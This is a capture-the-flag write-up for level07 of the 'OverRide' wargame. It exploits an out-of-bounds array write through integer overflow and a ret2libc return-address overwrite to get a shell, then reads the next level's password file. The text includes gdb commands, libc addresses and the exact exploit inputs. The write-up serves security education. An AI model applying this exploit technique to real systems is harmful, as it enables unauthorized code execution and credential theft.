### Download binary
``scp -P4242 level06@192.168.31.33:/home/users/level06/level06 ~/Bureau/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (refer to source code)

We notice that we can write to an array of 100 slots, and we can read from this same array.
We realize that we're prohibited from writing to indices that are multiples of 3 (0, 3, 6, 9, etc.) and 183 as number (?).
Furthermore, we discern that we can read values outside of the array's boundaries, and we can even write to these out-of-bounds slots.
We decide to perform a RET2LIBC to gain shell execution.

----

### Gathering infos to build the payload

**How to Write on index that are Multiples of 3**

To write to an index which are multiples of 3, we'll exploit integer overflow, using a number that isn't itself a multiple of 3.

**Finding EIP**

Through experimentation, at index 114, we discover the number 4158936339, which translates to F7E45513 in hexadecimal. This looks like an address, likely the EIP.
````
Input command: read
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully
````

The 114th index is the 115th position in the array (starting from 0).
Thus, max_int 2147483647 + 115 = **2147483762**.
This isn't a multiple of 3, perfect!


**Testing our EIP Overwrite Theory**

Input command: **store**
 Number: **666**
 Index: **2147483762**
 Completed store command successfully
Input command: read
 Index: **114**
 Number at data[**114**] is **666**
 Completed read command successfully
Input command: quit
**Segmentation fault (core dumped)**
--> Great! We have a segmentation fault, which means we successfully overwrote the EIP.

**Locating the 'system' Address**

``gdb ./level07``
``(gdb) b main``
[...]
``(gdb) r``
[...]
``(gdb) info function system``
[...]
>0xf7e6aed0  system

**Finding "/bin/sh" in Memory**

``(gdb) info proc map''
[...]
>0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
``(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"''
>0xf7f897ec

----

### Building of payload

Store at index 114: system.
114 is a multiple of 3, so we find the nearest int overflow: **2147483762** (2147483647 + 115).
System's address: f7e6aed0 -> **4159090384**.

Store at index 115: exit (optional).
We won't overcomplicate things since it's optional.

Store at index 116: /bin/sh.
116 isn't a multiple of 3, so we can use it directly.
Address of "/bin/sh": f7f897ec -> **4160264172**.

----

### Bypassing security


``level07@OverRide:~$ ./level07``
````
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$
````

``$ cat /home/users/level08/.pass``
>7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC






